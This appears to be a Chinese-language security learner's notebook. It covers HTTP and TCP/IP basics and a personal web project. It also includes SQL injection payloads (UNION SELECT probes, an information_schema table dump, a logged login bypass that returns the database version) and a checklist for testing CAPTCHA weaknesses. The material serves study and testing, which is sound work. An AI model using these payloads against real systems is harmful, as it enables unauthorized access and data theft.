HTTP协议4个步骤

建立连接——发送请求——给出应答——关闭连接

http劣势：将用户数据（用户名，密码）明文传输——易被窃听

而https具有保密功能

前端html网页，通过接口与后端php连接，前端接收用户提交的数据后，传递给后端，由后端处理后，再返回给前端。

tasks：

- [x] 1.修改url，避免出现.html或.php，同时避免访问.php脚本文件和通过.html访问网站

- [x] 2学习表单

- [x] 3.将后端与sql数据库结合，实现数据的调用和检查

- [x] 4.整理网站目录结构

SQL语句

end:-- cc;#

order by 

union select 1,2

version()

database()

group_concat(table_name) from information_schema.tables where table_schema=database()

SQL.log:

"username":"che' or '1'='1","password":"12"

"msg":"\u5bc6\u7801\u9519\u8bef" 

"username":"ch' #,"password":"12"

"msg":"\u7528\u6237\u540d\u548c\u5bc6\u7801\u5fc5\u586b"

"username":"' UNION SELECT version(),'12';#","password":"12"

"msg":"\u767b\u5f55\u6210\u529f","id":"id:5.7.26"

## TCP/IP四层模型

- **网络接口层（Network Interface Layer）:** 对应OSI的物理层和数据链路层。
- **网络层（Internet Layer）:** 对应OSI的网络层（如IP协议）。
- **传输层（Transport Layer）:** 对应OSI的传输层（如TCP、UDP协议）。
- **应用层（Application Layer）:** 对应OSI的应用层、表示层和会话层（如HTTP、DNS协议、DHCP协议）。

## 验证码漏洞

数据包中可能包含验证码

验证码复用

旧接口未清除

接口绕过（登录，注册）

手机号与验证码未绑定

验证逻辑漏洞（只读状态码）

空session_id跳过验证

1. 验证码是否复用：获取验证码后，不刷新页面，连续提交两次相同的验证码，看是否都能通过；
2. 是否关联会话：用两个浏览器（或隐私窗口）登录同一账号，在A窗口获取验证码，在B窗口输入，看能否通过；
3. 是否有过期时间：获取验证码后，等10分钟再提交，看是否还能通过；
4. 旧接口是否可用：如果网站有新版本，尝试用旧版链接（如/v1/login）登录，看是否无需验证码；
5. 参数删除测试：抓包后删除session_id、captcha等参数，提交后看是否能跳过验证；
6. 测试验证码尝试：输入常见测试值（0000、1234、aaaa），看是否能通过；
7. 前端源码检查：在浏览器“开发者工具-网络”中，查看“获取验证码”接口的响应，看是否有明文验证码。



